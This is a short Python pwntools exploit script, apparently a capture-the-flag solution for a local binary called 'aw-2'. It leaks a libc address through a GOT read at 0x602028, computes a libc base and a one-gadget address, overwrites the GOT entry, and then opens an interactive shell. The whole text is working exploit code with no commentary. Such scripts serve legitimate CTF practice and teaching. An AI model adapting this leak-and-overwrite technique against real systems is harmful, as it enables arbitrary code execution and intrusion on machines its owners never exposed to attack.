#!/usr/bin/python

from pwn import *
import time

poprdi = 0xa33 #: pop rdi ; ret
poprsi = 0xa31 #: pop rsi ; pop r15 ; ret

p = process("./aw-2")
p.sendline("8")
p.recv(timeout=5)
p.sendline("0x602028")
p.recvline(timeout=5)
res = p.recv(timeout=5)
res = res[:8]
libcbase = u64(res) - 0x55800#0x6f690
go = libcbase + 0x45216
print hex(libcbase)
print hex(go)
p.sendline("8")
time.sleep(.1)
p.sendline("0x602028")
time.sleep(.1)
p.sendline(p64(go))
p.interactive()
